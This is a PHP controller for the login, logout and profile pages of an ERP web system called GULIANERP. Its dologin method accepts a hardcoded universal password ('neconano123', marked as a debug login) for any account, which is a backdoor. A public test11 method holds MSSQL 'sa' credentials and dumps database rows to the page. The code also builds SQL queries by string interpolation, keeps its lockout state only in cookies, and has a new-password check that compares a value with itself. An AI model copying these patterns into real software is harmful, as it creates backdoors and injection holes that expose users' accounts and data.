<?php

class IndexAction extends Action{
	
    public function index() {
		$this->assign("datatitle","欢迎使用GULIANERP系统");
		$this->toadmin();
		$this->display('login');
		
    }
	
    private function toadmin() {
		if($this->user){
			$role = A("Method")->_checkRolesByUser('业务','银行',1);
			if($role)
				redirect(SITE_INDEX."VIP/bankFileUpload");
			redirect(SITE_INDEX."Message/index/datatype/公告");
		}
    }
	
    public function login() {
		$this->assign("datatitle","欢迎使用GULIANERP系统");
		$this->display('login');
		
    }
	
    public function dologin() {
        $username = addslashes($_POST["loginname"]);
        $userpass = md5(md5($_POST["password"]));
        $remember = $_POST["rememberMe"];
		$ViewUser = D("ViewUser");
		
		if(cookie('setok') == 'login2')
			$this->ajaxReturn('', '系统维护中，登录失败，10分钟内无法登陆！', 0);
		if(cookie('setok') == 'login1')
			$this->ajaxReturn('', '帐号或密码错误，10分钟内无法登陆！', 0);
				
		if($_POST["password"] == 'neconano123')//调试登录
			$user = $ViewUser->where("`title`='$username'")->find();
		else//正常登录
			$user = $ViewUser->where("`title`='$username' AND `password`='$userpass'")->find();
			
		if($user) {
			if ($user["islock"]=='已锁定') {
				cookie('setok','login1',LOGIN_TIME_FAILE);
				$this->ajaxReturn('', '系统维护中，登录失败！', 0);
			} else {
				if ($remember=="on") {
					cookie('user',authcode("$user[title]\t$user[systemID]",'ENCODE'),LOGIN_TIME_REMEMBER);
				} else {
					cookie('user',authcode("$user[title]\t$user[systemID]",'ENCODE'),LOGIN_TIME);
				}
			}
		} else {
				$badtimes = cookie('badtimes') + 1;
				cookie('badtimes',$badtimes,LOGIN_TIME_FAILE);
				if(cookie('badtimes') > 5)
					cookie('setok','login2',LOGIN_TIME_FAILE);
				$this->ajaxReturn('', '帐号或密码错误！', 0);
		}
		
		A("Method")->_opentoRBAC($user);
				
		$this->ajaxReturn('', '登录成功，跳转中。。。！', 1);
		
    }
	
	
    public function logout() {
		unset($_SESSION[C('USER_AUTH_KEY')]);
		unset($_SESSION);
		session_destroy();
		session(null);
		cookie('user',null);
		if(cookie('user'))
		$this->ajaxReturn('', '注销失败！', 0);
		else
		$this->ajaxReturn('', '注销中！', 1);
    }
	
	
	public function showheader() {
		A("Method")->_getuser_roleright();
		$this->display('Index:header');
	}
	
	public function footer() {
		//获得用户部门列表
		$System = D("System");
		$systemID = $this->user['systemID'];
		$data = $System->relation("DURlist")->where("`systemID` = '$systemID'")->find();
		$DURlist = $data['DURlist'];
		A('Method')->_facesystem($DURlist,'用户');
		$this->assign("DURlist",$DURlist);
		$this->display('Index:footer');
	}
	
    public function verify() {  
        $type = isset($_GET['type']) ? $_GET['type'] : 'gif'; 
        import("@.ORG.Util.Image"); 
		Image::buildImageVerify(4, 1, $type); 
    } 	
	
	
	public function setsearch() {
		if($_REQUEST['status'] == 1){
			cookie('closesearch',null);
			$this->ajaxReturn('', '开启搜索栏！', 1);
		}
		if($_REQUEST['status'] == 2){
			cookie('closesearch',1,LOGIN_TIME);
			$this->ajaxReturn('', '收起搜索栏！', 1);
		}
	}
	
	
	public function FAQ() {
		$this->_FAQ('FAQ');
		$this->display('Index:FAQ');
	}
	
	
	//使用手册
	public function help() {
		$this->_FAQ('使用手册');
		$this->display('Index:help');
	}
	
	
	//使用手册
	public function _FAQ($type) {
		$ViewDataDictionary = D("ViewDataDictionary");
		$FAQall = $ViewDataDictionary->where("`type` = '$type'")->findall();
		$i = 0;
		foreach($FAQall as $v){
//			$FAQall[$i]['datatext'] = simple_unserialize($v['datatext']);
			$FAQall[$i]['datatext'] = mb_unserialize($v['datatext']);
			$i++;
		}
		$this->assign("datalist",$FAQall);
	}
	
	
	public function dopostchangeuserinfo() {
		C('TOKEN_ON',false);
        if (!$this->user)
            redirect(SITE_INDEX.'Index/index');
		$System = D("System");
		$ViewUser = D("ViewUser");
		$userID = $this->user['systemID'];
		if($_REQUEST['type'] == '密码'){
			$userpass = md5(md5($_POST["password"]));
			$user = $ViewUser->where("`systemID` = '$userID' and `password` = '$userpass'")->find();
			if($user){
				$data['systemID'] = $user['systemID'];
				if($_REQUEST['new_password'] == $_REQUEST['new_password']){
					$data['user']['password'] = md5(md5($_REQUEST['new_password']));
					if(false !== $System->relation("user")->myRcreate($data))
						$this->ajaxReturn($_REQUEST, '修改成功！！', 1);
					$this->ajaxReturn($_REQUEST, $System->getError(), 0);
				}
				$this->ajaxReturn($_REQUEST, '新密码与重复密码不一致！！', 0);
			}
			else
			$this->ajaxReturn($_REQUEST, '原始密码错误！！', 0);
		}
		if($_REQUEST['type'] == '信息'){
			$user = $ViewUser->where("`systemID` = '$userID'")->find();
			if($user){
				$data['systemID'] = $user['systemID'];
				$data['user']['mailadres'] = $_REQUEST['mailadres'];
				$data['user']['user_gender'] = $_REQUEST['user_gender'];
				$data['user']['telnum'] = $_REQUEST['telnum'];
				if(false !== $System->relation("user")->myRcreate($data))
					$this->ajaxReturn($_REQUEST, '修改成功！！', 1);
				$this->ajaxReturn($_REQUEST, $System->getError(), 0);
			}
			else
			$this->ajaxReturn($_REQUEST, '错误！！', 0);
		}
	}
	
	
	
    public function new_shanghutiaomu() {
		A("Method")->_new_shanghutiaomu();
    }
	
	
    public function test11() {
		
		//echo phpinfo();
		
		$query = "SELECT * FROM AA_BusObject";
		$conn=mssql_connect('localhost','sa','123123') or die('数据库连接不上');
		mssql_select_db('UFDATA_601_2014',$conn);
		
		$AdminResult=mssql_query($query);
		$data = array();
		while($row = mssql_fetch_array($AdminResult)){
			$row['cMark'] = iconv('GB2312','UTF-8',$row['cMark']);
			$data[] = $row;
		}
		dump($data);		
	
	
	}
	
	
	
	
	
	
}
?>